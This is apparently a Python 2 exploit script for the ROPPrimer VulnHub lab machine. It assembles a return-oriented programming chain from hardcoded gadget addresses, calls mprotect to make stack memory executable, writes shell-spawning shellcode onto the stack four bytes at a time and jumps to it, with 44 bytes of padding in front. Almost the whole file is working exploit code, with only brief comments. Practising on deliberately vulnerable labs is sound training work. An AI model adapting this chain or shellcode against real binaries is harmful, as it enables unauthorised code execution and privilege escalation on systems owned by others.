#check out ROPPrimer on vulnhub
import struct

#pack data in little endian order, with padding
def p(x):
    return struct.pack('<L',x)

#function to write addresses to the stack, I believe. It's been about 6 months
#¯\_(ツ)_/¯
def write_to_mem(addr, val):
    g = ""
    g += p(pop_edx)
    g += p(val)
    g += p(0x0806fb4c)
    g += p(pop_edx)
    g += p(addr)
    g += p(0x08078e71)
    return g

#edx rops
pop_edx = 0x08052476
inc_edx = 0x0808f4f4

#ecx rops
pop_ecx = 0x080658d7
dec_ecx = 0x080488e9

#ebx rops
pop_ebx = 0x0805249e
inc_ebx = 0x08054ce3
dec_ebx = 0x0804f871

#functions
mprotect = 0x805229d #mprotect + 13
read = 0x80516a0 #read

buf = ""
#put 0x7 into edx
buf += p(pop_edx)
buf += p(0xFFFFFFFF)
buf += p(inc_edx)*8

#put 0x01010101 into ecx (size)
buf += p(pop_ecx)
buf += p(0x01010101)

#write ebx to addr
buf += p(pop_ebx)
buf += p(0xbffdf001) #address of writeable stack (used as return address) (added 1 to remove nullbyte)
buf += p(0x0804f871) #dec ebx;ret (to remove 1 added to return address)

#call mprotect
buf += p(mprotect)
buf += "FAKE" #ebx after everything is done

# write shellcode to stack
buf += write_to_mem(0xbffdf040, 0x99580b6a) #eip after everything is done
buf += write_to_mem(0xbffdf044, 0x2d686652)
buf += write_to_mem(0xbffdf048, 0x52e18970)
buf += write_to_mem(0xbffdf04c, 0x2f68686a)
buf += write_to_mem(0xbffdf050, 0x68736162)
buf += write_to_mem(0xbffdf054, 0x6e69622f)
buf += write_to_mem(0xbffdf058, 0x5152e389)
buf += write_to_mem(0xbffdf05c, 0xcde18953)
buf += write_to_mem(0xbffdf060, 0x80808080)

#pop edx; jump to edx (shellcode)
buf += p(pop_edx)
buf += p(0xbffdf040)
buf += p(0x0808402f) #jmp edx

print "A"*44 + buf
